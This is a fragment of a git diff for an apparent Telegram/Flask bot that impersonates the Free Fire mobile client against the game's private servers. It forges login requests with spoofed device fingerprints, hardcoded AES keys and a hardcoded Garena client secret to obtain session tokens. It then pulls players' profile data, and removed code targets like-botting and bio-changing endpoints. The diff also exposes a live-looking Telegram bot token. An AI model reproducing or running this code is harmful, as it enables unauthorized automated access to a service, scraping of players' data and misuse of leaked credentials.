\x01(\rH\x06\x88\x01\x01\x42\n\n\x08_clan_idB\x0c\n\n_clan_nameB\r\n\x0b_captain_idB\r\n\x0b_clan_levelB\x0b\n\t_capacityB\r\n\x0b_member_numB\x0e\n\x0c_honor_point\"|\n\x0cPetSkillInfo\x12\x13\n\x06pet_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x15\n\x08skill_id\x18\x02 \x01(\rH\x01\x88\x01\x01\x12\x18\n\x0bskill_level\x18\x03 \x01(\rH\x02\x88\x01\x01\x42\t\n\x07_pet_idB\x0b\n\t_skill_idB\x0e\n\x0c_skill_level\"\x84\x03\n\x07PetInfo\x12\x0f\n\x02id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x11\n\x04name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x12\n\x05level\x18\x03 \x01(\rH\x02\x88\x01\x01\x12\x10\n\x03\x65xp\x18\x04 \x01(\rH\x03\x88\x01\x01\x12\x18\n\x0bis_selected\x18\x05 \x01(\x08H\x04\x88\x01\x01\x12\x14\n\x07skin_id\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x0f\n\x07\x61\x63tions\x18\x07 \x03(\r\x12&\n\x06skills\x18\x08 \x03(\x0b\x32\x16.freefire.PetSkillInfo\x12\x1e\n\x11selected_skill_id\x18\t \x01(\rH\x06\x88\x01\x01\x12\x1b\n\x0eis_marked_star\x18\n \x01(\x08H\x07\x88\x01\x01\x12\x15\n\x08\x65nd_time\x18\x0b \x01(\rH\x08\x88\x01\x01\x42\x05\n\x03_idB\x07\n\x05_nameB\x08\n\x06_levelB\x06\n\x04_expB\x0e\n\x0c_is_selectedB\n\n\x08_skin_idB\x14\n\x12_selected_skill_idB\x11\n\x0f_is_marked_starB\x0b\n\t_end_time\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\x42\x0f\n\r_diamond_cost\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x14\n\x07is_init\x18\x02 \x01(\x08H\x01\x88\x01\x01\x12\x30\n\x0creward_state\x18\x03 \x01(\x0e\x32\x15.freefire.RewardStateH\x02\x88\x01\x01\x12&\n\x19periodic_summary_like_cnt\x18\x04 \x01(\rH\x03\x88\x01\x01\x12)\n\x1cperiodic_summary_illegal_cnt\x18\x05 \x01(\rH\x04\x88\x01\x01\x12\x1d\n\x10weekly_match_cnt\x18\x06 \x01(\rH\x05\x88\x01\x01\x12(\n\x1bperiodic_summary_start_time\x18\x07 \x01(\x03H\x06\x88\x01\x01\x12&\n\x19periodic_summary_end_time\x18\x08 \x01(\x03H\x07\x88\x01\x01\x42\x0f\n\r_credit_scoreB\n\n\x08_is_initB\x0f\n\r_reward_stateB\x1c\n\x1a_periodic_summary_like_cntB\x1f\n\x1d_periodic_summary_illegal_cntB\x13\n\x11_weekly_match_cntB\x1e\n\x1c_periodic_summary_start_timeB\x1c\n\x1a_periodic_summary_end_time\"L\n\x0c\x45quipAchInfo\x12\x13\n\x06\x61\x63h_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x12\n\x05level\x18\x02 \x01(\rH\x01\x88\x01\x01\x42\t\n\x07_ach_idB\x08\n\x06_level\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12$\n\x17ranking_leaderboard_pos\x18\x03 \x01(\x05H\x02\x88\x01\x01\x12#\n\x04news\x18\x04 \x03(\x0b\x32\x15.freefire.AccountNews\x12.\n\x0fhistory_ep_info\x18\x05 \x03(\x0b\x32\x15.freefire.BasicEPInfo\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12;\n\x12\x63\x61ptain_basic_info\x18\x07 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x04\x88\x01\x01\x12(\n\x08pet_info\x18\x08 \x01(\x0b\x32\x11.freefire.PetInfoH\x05\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x12=\n\x10pre_veteran_type\x18\x0c \x01(\x0e\x32\x1e.freefire.PreVeteranActionTypeH\t\x88\x01\x01\x12,\n\x0c\x65quipped_ach\x18\r \x03(\x0b\x32\x16.freefire.EquipAchInfoB\r\n\x0b_basic_infoB\x0f\n\r_profile_infoB\x1a\n\x18_ranking_leaderboard_posB\x12\n\x10_clan_basic_infoB\x15\n\x13_captain_basic_infoB\x0b\n\t_pet_infoB\x0e\n\x0c_social_infoB\x13\n\x11_diamond_cost_resB\x14\n\x12_credit_score_infoB\x13\n\x11_pre_veteran_type*\xa0\x01\n\x10VeteranLeaveDays\x12\x19\n\x15VeteranLeaveDays_NONE\x10\x00\x12\x1a\n\x16VeteranLeaveDays_SHORT\x10\x01\x12\x1b\n\x17VeteranLeaveDays_NORMAL\x10\x02\x12\x19\n\x15VeteranLeaveDays_LONG\x10\x03\x12\x1d\n\x19VeteranLeaveDays_VERYLONG\x10\x04*w\n\x14PreVeteranActionType\x12\x1d\n\x19PreVeteranActionType_NONE\x10\x00\x12!\n\x1dPreVeteranActionType_ACTIVITY\x10\x01\x12\x1d\n\x19PreVeteranActionType_BUFF\x10\x02*s\n\x12\x45xternalIconStatus\x12\x1b\n\x17\x45xternalIconStatus_NONE\x10\x00\x12!\n\x1d\x45xternalIconStatus_NOT_IN_USE\x10\x01\x12\x1d\n\x19\x45xternalIconStatus_IN_USE\x10\x02*t\n\x14\x45xternalIconShowType\x12\x1d\n\x19\x45xternalIconShowType_NONE\x10\x00\x12\x1f\n\x1b\x45xternalIconShowType_FRIEND\x10\x01\x12\x1c\n\x18\x45xternalIconShowType_ALL\x10\x02*\xf0\x02\n\tHighLight\x12\x12\n\x0eHighLight_NONE\x10\x00\x12\x14\n\x10HighLight_BR_WIN\x10\x01\x12\x14\n\x10HighLight_CS_MVP\x10\x02\x12\x1b\n\x17HighLight_BR_STREAK_WIN\x10\x03\x12\x1b\n\x17HighLight_CS_STREAK_WIN\x10\x04\x12#\n\x1fHighLight_CS_RANK_GROUP_UPGRADE\x10\x05\x12\x16\n\x12HighLight_TEAM_ACE\x10\x06\x12 \n\x1cHighLight_WEAPON_POWER_TITLE\x10\x07\x12#\n\x1fHighLight_BR_RANK_GROUP_UPGRADE\x10\t\x12&\n\"HighLight_BR_STREAK_WIN_EXECELLENT\x10\n\x12&\n\"HighLight_CS_STREAK_WIN_EXECELLENT\x10\x0b\x12\x15\n\x11HighLight_VETERAN\x10\x0c*T\n\x06Gender\x12\x0f\n\x0bGender_NONE\x10\x00\x12\x0f\n\x0bGender_MALE\x10\x01\x12\x11\n\rGender_FEMALE\x10\x02\x12\x15\n\x10Gender_UNLIMITED\x10\xe7\x07*\xf5\x03\n\x08Language\x12\x11\n\rLanguage_NONE\x10\x00\x12\x0f\n\x0bLanguage_EN\x10\x01\x12\x1a\n\x16Language_CN_SIMPLIFIED\x10\x02\x12\x1b\n\x17Language_CN_TRADITIONAL\x10\x03\x12\x11\n\rLanguage_Thai\x10\x04\x12\x17\n\x13Language_VIETNAMESE\x10\x05\x12\x17\n\x13Language_INDONESIAN\x10\x06\x12\x17\n\x13Language_PORTUGUESE\x10\x07\x12\x14\n\x10Language_SPANISH\x10\x08\x12\x14\n\x10Language_RUSSIAN\x10\t\x12\x13\n\x0fLanguage_KOREAN\x10\n\x12\x13\n\x0fLanguage_FRENCH\x10\x0b\x12\x13\n\x0fLanguage_GERMAN\x10\x0c\x12\x14\n\x10Language_TURKISH\x10\r\x12\x12\n\x0eLanguage_HINDI\x10\x0e\x12\x15\n\x11Language_JAPANESE\x10\x0f\x12\x15\n\x11Language_ROMANIAN\x10\x10\x12\x13\n\x0fLanguage_ARABIC\x10\x11\x12\x14\n\x10Language_BURMESE\x10\x12\x12\x11\n\rLanguage_URDU\x10\x13\x12\x14\n\x10Language_BENGALI\x10\x14\x12\x17\n\x12Language_UNLIMITED\x10\xe7\x07*l\n\nTimeOnline\x12\x13\n\x0fTimeOnline_NONE\x10\x00\x12\x16\n\x12TimeOnline_WORKDAY\x10\x01\x12\x16\n\x12TimeOnline_WEEKEND\x10\x02\x12\x19\n\x14TimeOnline_UNLIMITED\x10\xe7\x07*\x84\x01\n\nTimeActive\x12\x13\n\x0fTimeActive_NONE\x10\x00\x12\x16\n\x12TimeActive_MORNING\x10\x01\x12\x18\n\x14TimeActive_AFTERNOON\x10\x02\x12\x14\n\x10TimeActive_NIGHT\x10\x03\x12\x19\n\x14TimeActive_UNLIMITED\x10\xe7\x07*\xf6\x02\n\x11PlayerBattleTagID\x12\x1a\n\x16PlayerBattleTagID_NONE\x10\x00\x12!\n\x1cPlayerBattleTagID_DOMINATION\x10\xcd\x08\x12\x1e\n\x19PlayerBattleTagID_UNCROWN\x10\xce\x08\x12\"\n\x1dPlayerBattleTagID_BESTPARTNER\x10\xcf\x08\x12\x1d\n\x18PlayerBattleTagID_SNIPER\x10\xd0\x08\x12\x1c\n\x17PlayerBattleTagID_MELEE\x10\xd1\x08\x12!\n\x1cPlayerBattleTagID_PEACEMAKER\x10\xd2\x08\x12\x1d\n\x18PlayerBattleTagID_AMBUSH\x10\xd3\x08\x12 \n\x1bPlayerBattleTagID_SHORTSTOP\x10\xd4\x08\x12\x1e\n\x19PlayerBattleTagID_RAMPAGE\x10\xd5\x08\x12\x1d\n\x18PlayerBattleTagID_LEADER\x10\xd6\x08*\xe4\x01\n\tSocialTag\x12\x12\n\x0eSocialTag_NONE\x10\x00\x12\x16\n\x11SocialTag_FASHION\x10\xb5\x10\x12\x15\n\x10SocialTag_SOCIAL\x10\xb6\x10\x12\x16\n\x11SocialTag_VETERAN\x10\xb7\x10\x12\x15\n\x10SocialTag_NEWBIE\x10\xb8\x10\x12\x19\n\x14SocialTag_PLAYFORWIN\x10\xb9\x10\x12\x19\n\x14SocialTag_PLAYFORFUN\x10\xba\x10\x12\x16\n\x11SocialTag_VOICEON\x10\xbb\x10\x12\x17\n\x12SocialTag_VOICEOFF\x10\xbc\x10*\x80\x01\n\nModePrefer\x12\x13\n\x0fModePrefer_NONE\x10\x00\x12\x11\n\rModePrefer_BR\x10\x01\x12\x11\n\rModePrefer_CS\x10\x02\x12\x1c\n\x18ModePrefer_ENTERTAINMENT\x10\x03\x12\x19\n\x14ModePrefer_UNLIMITED\x10\xe7\x07*X\n\x08RankShow\x12\x11\n\rRankShow_NONE\x10\x00\x12\x0f\n\x0bRankShow_BR\x10\x01\x12\x0f\n\x0bRankShow_CS\x10\x02\x12\x17\n\x12RankShow_UNLIMITED\x10\xe7\x07*L\n\x1b\x45LeaderBoardTitleRegionType\x12\x08\n\x04None\x10\x00\x12\x0b\n\x07\x43ountry\x10\x01\x12\x0c\n\x08Province\x10\x02\x12\x08\n\x04\x43ity\x10\x03*6\n\nUnlockType\x12\x13\n\x0fUnlockType_NONE\x10\x00\x12\x13\n\x0fUnlockType_LINK\x10\x01*E\n\x0b\x45quipSource\x12\x14\n\x10\x45quipSource_SELF\x10\x00\x12 \n\x1c\x45quipSource_CONFIDANT_FRIEND\x10\x01*\xfa\x01\n\x08NewsType\x12\x11\n\rNewsType_NONE\x10\x00\x12\x11\n\rNewsType_RANK\x10\x01\x12\x14\n\x10NewsType_LOTTERY\x10\x02\x12\x15\n\x11NewsType_PURCHASE\x10\x03\x12\x18\n\x14NewsType_TREASUREBOX\x10\x04\x12\x16\n\x12NewsType_ELITEPASS\x10\x05\x12\x1a\n\x16NewsType_EXCHANGESTORE\x10\x06\x12\x13\n\x0fNewsType_BUNDLE\x10\x07\x12#\n\x1fNewsType_LOTTERYSPECIALEXCHANGE\x10\x08\x12\x13\n\x0fNewsType_OTHERS\x10\t*]\n\x0bRewardState\x12\x18\n\x14REWARD_STATE_INVALID\x10\x00\x12\x1a\n\x16REWARD_STATE_UNCLAIMED\x10\x01\x12\x18\n\x14REWARD_STATE_CLAIMED\x10\x02\x62\x06proto3')
+_g3 = {}
+_builder.BuildMessageAndEnumDescriptors(APS_DESC, _g3)
+_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _g3)
+AccountPersonalShowInfo = _g3['AccountPersonalShowInfo']
 
-MajorLogin = _req_globals['MajorLogin']
-GameSecurity = _req_globals['GameSecurity']
+# ==================== CONFIG ====================
+from Crypto.Cipher import AES as CryptoAES
+G = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
+F = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
 
-_res_desc = _descriptor_pool.Default().AddSerializedFile(
-    b'\n\x13MajorLoginRes.proto"|\n\rMajorLoginRes'
-    b'\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04'
-    b'\x12\x0e\n\x06region\x18\x02 \x01(\t'
-    b'\x12\r\n\x05token\x18\x08 \x01(\t'
-    b'\x12\x0b\n\x03url\x18\n \x01(\t'
-    b'\x12\x11\n\ttimestamp\x18\x15 \x01(\x03'
-    b'\x12\x0b\n\x03key\x18\x16 \x01(\x0c'
-    b'\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3'
-)
-
-_res_globals = {}
-_builder.BuildMessageAndEnumDescriptors(_res_desc, _res_globals)
-_builder.BuildTopDescriptorsAndMessages(_res_desc, 'MajorLoginRes_pb2', _res_globals)
-if not _descriptor._USE_C_DESCRIPTORS:
-    _res_desc._loaded_options = None
-    _res_globals['_MAJORLOGINRES']._serialized_start = 23
-    _res_globals['_MAJORLOGINRES']._serialized_end = 147
-
-MajorLoginRes = _res_globals['MajorLoginRes']
-
-# ============ IMPORT PROTOBUF UNTUK PROFILE ============
-try:
-    import like_count_pb2
-    import uid_generator_pb2
-    PROTOBUF_AVAILABLE = True
-except ImportError:
-    PROTOBUF_AVAILABLE = False
-    print("⚠️  Protobuf files not found, using raw mode")
-
-# ============ KONFIGURASI ============
-AES_KEY = b'Yg&tc%DEuh6%Zc^8'
-AES_IV = b'6oyZDr22E3ychjM%'
-
-GARENA_OAUTH_URL = "https://100067.connect.garena.com/oauth/guest/token/grant"
-MAJORLOGIN_URL = "https://loginbp.ggblueshark.com/MajorLogin"
-
-CLIENT_SECRET = "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3"
-CLIENT_ID = "100067"
-
-HTTP_HEADERS = {
-    'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)',
-    'Connection': 'Keep-Alive',
-    'Accept-Encoding': 'gzip',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Expect': '100-continue',
-    'X-Unity-Version': '2018.4.11f1',
-    'X-GA': 'v1 1',
-    'ReleaseVersion': 'OB54',
-}
-
-# ============ TELEGRAM CONFIG ============
 BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
 OWNER_ID = 8660700322
 CHANNEL_PROMO = "@dindingijo"
 
-# ============ KONFIGURASI ============
-FREEFIRE_UPDATE_URLS = [
-    "https://clientbp.ggblueshark.com/UpdateSocialBasicInfo",
-    "https://clientbp.common.ggbluefox.com/UpdateSocialBasicInfo",
-]
+app = Flask(__name__)
 
-KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
-IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
+# ==================== HELPERS ====================
+def pad(d): l=CryptoAES.block_size-(len(d)%CryptoAES.block_size); return d+bytes([l]*l)
+def encrypt(d): return CryptoAES.new(G, CryptoAES.MODE_CBC, F).encrypt(pad(d))
+def parse_pb(d, mt): m=mt(); m.ParseFromString(d); return m
 
-# ============ HEADERS ============
-BIO_HEADERS = {
-    "Expect": "100-continue",
-    "X-Unity-Version": "2018.4.11f1",
-    "X-GA": "v1 1",
-    "ReleaseVersion": "OB54",
-    "Content-Type": "application/x-www-form-urlencoded",
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-}
+def b64_decode(s):
+    s += '='*(4-len(s)%4) if len(s)%4 else ''
+    return json.loads(base64.b64decode(s))
 
-LOGIN_HEADERS = {
-    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
-    "Connection": "Keep-Alive",
-    "Accept-Encoding": "gzip",
-    "Content-Type": "application/octet-stream",
-    "Expect": "100-continue",
-    "X-Unity-Version": "2018.4.11f1",
-    "X-GA": "v1 1",
-    "ReleaseVersion": "OB54"
-}
-
-# ============ SERVER CONFIG ============
-SERVER_CONFIG = {
-    "ID": {
-        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
-        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
-        "region_code": "ID",
-        "name": "Indonesia",
-        "priority": 1
-    },
-    "IND": {
-        "info_url": "https://client.ind.freefiremobile.com/GetPlayerPersonalShow",
-        "like_url": "https://client.ind.freefiremobile.com/LikeProfile",
-        "region_code": "IND",
-        "name": "India",
-        "priority": 2
-    },
-    "BR": {
-        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
-        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
-        "region_code": "BR",
-        "name": "Brazil",
-        "priority": 3
-    },
-    "US": {
-        "info_url": "https://client.us.freefiremobile.com/GetPlayerPersonalShow",
-        "like_url": "https://client.us.freefiremobile.com/LikeProfile",
-        "region_code": "US",
-        "name": "United States",
-        "priority": 4
-    },
-    "BD": {
-        "info_url": "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow",
-        "like_url": "https://clientbp.ggpolarbear.com/LikeProfile",
-        "region_code": "BD",
-        "name": "Bangladesh",
-        "priority": 5
-    }
-}
-
-# ============ FUNGSI ============
-def aes_encrypt_profile(data):
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
-    return cipher.encrypt(pad(data, AES.block_size))
-
-def enc_uid(uid: str) -> str:
+def decode_jwt(token):
     try:
-        if PROTOBUF_AVAILABLE:
-            uid_msg = uid_generator_pb2.uid_generator()
-            uid_msg.krishna_ = int(uid)
-            uid_msg.teamXdarks = 1
-            encrypted = binascii.hexlify(aes_encrypt_profile(uid_msg.SerializeToString())).decode()
-            return encrypted
-        else:
-            import struct
-            raw_data = struct.pack('>Q', int(uid)) + b'\x01' * 8
-            encrypted = binascii.hexlify(aes_encrypt_profile(raw_data)).decode()
-            return encrypted
-    except Exception as e:
-        print(f"Encrypt error: {e}")
-        return None
+        parts = token.split('.')
+        if len(parts) < 2: return None
+        p = parts[1]
+        p += '=' * (4 - len(p) % 4) if len(p) % 4 else ''
+        return json.loads(base64.b64decode(p))
+    except: return None
 
-def parse_protobuf_response(binary_data: bytes):
-    if PROTOBUF_AVAILABLE:
-        try:
-            items = like_count_pb2.Info()
-            items.ParseFromString(binary_data)
-            return json.loads(MessageToJson(items))
-        except:
-            pass
-    
+# ==================== SYNC ASYNC WRAPPER ====================
+def run_async(coro):
     try:
-        import re
-        result = {"AccountInfo": {}}
-        
-        name_match = re.findall(b'[\x20-\x7e]{3,30}', binary_data)
-        if name_match:
-            valid_names = [n.decode('utf-8', errors='ignore') for n in name_match 
-                         if n.decode('utf-8', errors='ignore').isprintable()
-                         and len(n.decode('utf-8', errors='ignore')) > 3
-                         and not n.decode('utf-8', errors='ignore').startswith('http')]
-            if valid_names:
-                result["AccountInfo"]["PlayerNickname"] = valid_names[0]
-        
-        numbers = re.findall(b'\x00{0,4}(\d{1,10})\x00', binary_data)
-        if len(numbers) >= 2:
-            result["AccountInfo"]["Likes"] = int(numbers[0]) if numbers[0].isdigit() else 0
-            result["AccountInfo"]["PlayerLevel"] = int(numbers[1]) if len(numbers) > 1 and numbers[1].isdigit() else 0
-        
-        return result if result.get("AccountInfo") and result["AccountInfo"].get("PlayerNickname") else None
-    except:
-        return None
+        loop = asyncio.new_event_loop()
+        result = loop.run_until_complete(coro)
+        loop.close()
+        return result
+    except: return None
 
-def check_profile_with_jwt(uid: str, jwt_token: str, server: str = "ID"):
-    server_config = SERVER_CONFIG.get(server.upper())
-    if not server_config:
-        return None
+async def gen_token_async(creds):
+    data = creds + "&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
+    async with httpx.AsyncClient(timeout=30) as c:
+        r = await c.post("https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant", data=data, headers={'Content-Type': "application/x-www-form-urlencoded"})
+        d = r.json(); token, oid = d.get("access_token", "0"), d.get("open_id", "0")
+    if token == "0": return None
     
-    encrypted = enc_uid(str(uid))
-    if not encrypted:
-        return None
+    m = LoginReq(); _json_format.ParseDict({"open_id": oid, "open_id_type": "4", "login_token": token, "orign_platform_type": "4"}, m)
+    pb = m.SerializeToString()
     
-    headers = {
-        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_Z01QD Build/PI)",
-        'Authorization': f"Bearer {jwt_token}",
-        'Content-Type': "application/x-www-form-urlencoded",
-        'X-GA': "v1 1",
-        'ReleaseVersion': "OB54"
-    }
-    
-    try:
-        edata = bytes.fromhex(encrypted)
-        response = requests.post(
-            server_config["info_url"],
-            data=edata,
-            headers=headers,
-            timeout=10,
-            verify=False
-        )
-        
-        if response.status_code == 200:
-            parsed = parse_protobuf_response(response.content)
-            
-            if parsed and parsed.get('AccountInfo'):
-                account_info = parsed['AccountInfo']
-                return {
-                    "uid": uid,
-                    "name": account_info.get('PlayerNickname', 'Unknown'),
-                    "level": account_info.get('PlayerLevel', '?'),
-                    "likes": account_info.get('Likes', 0),
-                    "server": server,
-                    "server_name": server_config["name"],
-                    "guild": account_info.get('GuildName', 'No Guild'),
-                    "status": "✅ Found"
-                }
-        return None
-    except Exception as e:
-        print(f"Profile check error: {e}")
-        return None
-
-def check_profile_all_servers(uid: str, jwt_token: str):
-    sorted_servers = sorted(SERVER_CONFIG.items(), key=lambda x: x[1]['priority'])
-    
-    for server_code, server_config in sorted_servers:
-        profile = check_profile_with_jwt(uid, jwt_token, server_code)
-        if profile:
-            return profile
-    
+    async with httpx.AsyncClient(timeout=30) as c:
+        r = await c.post("https://loginbp.ggpolarbear.com/MajorLogin", data=encrypt(pb), headers={'Content-Type': "application/octet-stream", 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"})
+        if r.status_code == 200:
+            msg = json.loads(_json_format.MessageToJson(parse_pb(r.content, LoginRes)))
+            return f"Bearer {msg.get('token', '0')}"
     return None
 
-# ============ FUNGSI JWT GENERATOR ============
-def random_ua():
-    versions = ['4.0.18P6', '4.0.19P7', '4.1.0P3', '5.0.1B2', '5.2.5P3', '5.3.2P2', '5.4.3B2', '5.5.2P3']
-    models = ['SM-A125F', 'POCO M3', 'Redmi 9A', 'RMX2185', 'moto g(9) play', 'ASUS_Z01QD', 'OnePlus Nord']
-    android = random.choice(['9', '10', '11', '12', '13'])
-    lang = random.choice(['en-US', 'hi-IN', 'pt-BR', 'id-ID'])
-    country = random.choice(['USA', 'IND', 'BRA', 'IDN'])
-    return f"GarenaMSDK/{random.choice(versions)}({random.choice(models)};Android {android};{lang};{country};)"
-
-def aes_encrypt_data(data):
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
-    return cipher.encrypt(pad(data, AES.block_size))
-
-def get_garena_tokens_sync(uid, password):
-    headers = dict(HTTP_HEADERS)
-    headers["User-Agent"] = random_ua()
-    headers["Host"] = "100067.connect.garena.com"
-    headers["Accept-Encoding"] = "gzip, deflate, br"
-    headers["Connection"] = "close"
-
-    payload = {
-        "uid": uid,
-        "password": password,
-        "response_type": "token",
-        "client_type": "2",
-        "client_secret": CLIENT_SECRET,
-        "client_id": CLIENT_ID,
+async def fetch_player_async(uid, token, server_url):
+    m = GetPlayerPersonalShow(); _json_format.ParseDict({"a": str(uid), "b": "7"}, m)
+    pb = m.SerializeToString()
+    async with httpx.AsyncClient(timeout=30) as c:
+        r = await c.post(f"{server_url}/GetPlayerPersonalShow", data=encrypt(pb), headers={'Content-Type': "application/octet-stream", 'Authorization': token if token.startswith("Bearer ") else f"Bearer {token}", 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"})
+    if r.status_code != 200: return None
+    data = json.loads(_json_format.MessageToJson(parse_pb(r.content, AccountPersonalShowInfo)))
+    basic = data.get('basicInfo', {})
+    if not basic.get('nickname'): return None
+    profile = data.get('profileInfo', {}); social = data.get('socialInfo', {}); clan = data.get('clanBasicInfo', {})
+    return {
+        'uid': uid, 'nickname': basic.get('nickname', '?'), 'level': basic.get('level', 0),
+        'region': basic.get('region', '?'), 'br_rank': basic.get('rank', 0),
+        'cs_rank': basic.get('csRank', 0), 'liked': basic.get('liked', 0),
+        'clan': clan.get('clanName', ''), 'clan_level': clan.get('clanLevel', 0),
+        'avatar': profile.get('avatarId', ''), 'clothes': profile.get('clothes', []),
+        'skills': len(profile.get('equipedSkills', [])), 'signature': social.get('signature', ''),
+        'diamond': data.get('diamondCostRes', {}).get('diamondCost', 0),
+        'credit': data.get('creditScoreInfo', {}).get('creditScore', 100),
+        'created': basic.get('createAt', ''), 'last_login': basic.get('lastLoginAt', ''),
     }
 
-    try:
-        resp = requests.post(GARENA_OAUTH_URL, headers=headers, data=payload, timeout=15, verify=False)
-        if resp.status_code != 200:
-            return None
-        body = resp.json()
-        open_id = body.get("open_id")
-        access_token = body.get("access_token")
-        if not open_id or not access_token:
-            return None
-        return {"open_id": open_id, "access_token": access_token}
-    except:
-        return None
-
-def build_major_login_payload_sync(open_id, access_token):
-    ml = MajorLogin()
-    ml.event_time = str(datetime.now())[:-7]
-    ml.game_name = "free fire"
-    ml.platform_id = 1
-    ml.client_version = "2.124.1"
-    ml.system_software = "Android OS 9 / API-28 (PQ3B.190801.10101846/G9650ZHU2ARC6)"
-    ml.system_hardware = "Handheld"
-    ml.telecom_operator = "Verizon"
-    ml.network_type = "WIFI"
-    ml.screen_width = 1920
-    ml.screen_height = 1080
-    ml.screen_dpi = "280"
-    ml.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
-    ml.memory = 3003
-    ml.gpu_renderer = "Adreno (TM) 640"
-    ml.gpu_version = "OpenGL ES 3.1 v1.46"
-    ml.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
-    ml.client_ip = "223.191.51.89"
-    ml.language = "en"
-    ml.open_id = open_id
-    ml.open_id_type = "4"
-    ml.device_type = "Handheld"
-    ml.memory_available.version = 55
-    ml.memory_available.hidden_value = 81
-    ml.access_token = access_token
-    ml.platform_sdk_id = 1
-    ml.network_operator_a = "Verizon"
-    ml.network_type_a = "WIFI"
-    ml.client_using_version = "7428b253defc164018c604a1ebbfebdf"
-    ml.external_storage_total = 36235
-    ml.external_storage_available = 31335
-    ml.internal_storage_total = 2519
-    ml.internal_storage_available = 703
-    ml.game_disk_storage_available = 25010
-    ml.game_disk_storage_total = 26628
-    ml.external_sdcard_avail_storage = 32992
-    ml.external_sdcard_total_storage = 36235
-    ml.login_by = 3
-    ml.library_path = "/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/lib/arm64"
-    ml.reg_avatar = 1
-    ml.library_token = "5b892aaabd688e571f688053118a162b|/data/app/com.dts.freefireth-YPKM8jHEwAJlhpmhDhv5MQ==/base.apk"
-    ml.channel_type = 3
-    ml.cpu_type = 2
-    ml.cpu_architecture = "64"
-    ml.client_version_code = "2019118695"
-    ml.graphics_api = "OpenGLES2"
-    ml.supported_astc_bitset = 16383
-    ml.login_open_id_type = 4
-    ml.analytics_detail = b"FwQVTgUPX1UaUllDDwcWCRBpWA0FUgsvA1snWlBaO1kFYg=="
-    ml.loading_time = 13564
-    ml.release_channel = "android"
-    ml.extra_info = "KqsHTymw5/5GB23YGniUYN2/q47GATrq7eFeRatf0NkwLKEMQ0PK5BKEk72dPflAxUlEBir6Vtey83XqF593qsl8hwY="
-    ml.android_engine_init_flag = 110009
-    ml.if_push = 1
-    ml.is_vpn = 1
-    ml.origin_platform_type = "4"
-    ml.primary_platform_type = "4"
-    return aes_encrypt_data(ml.SerializeToString())
-
-def major_login_sync(encrypted_payload):
-    try:
-        resp = requests.post(MAJORLOGIN_URL, data=encrypted_payload, headers=HTTP_HEADERS, timeout=15, verify=False)
-        if resp.status_code != 200:
-            return None
-        raw = resp.content
-        proto = MajorLoginRes()
-        proto.ParseFromString(raw)
-        return {
-            "token": proto.token,
-            "region": proto.region,
-            "url": proto.url,
-            "tcp_key": proto.key.hex() if proto.key else None,
-            "tcp_iv": proto.iv.hex() if proto.iv else None,
-        }
-    except:
-        return None
-
-def generate_jwt_sync(uid, password):
-    try:
-        oauth = get_garena_tokens_sync(uid, password)
-        if not oauth:
-            return None
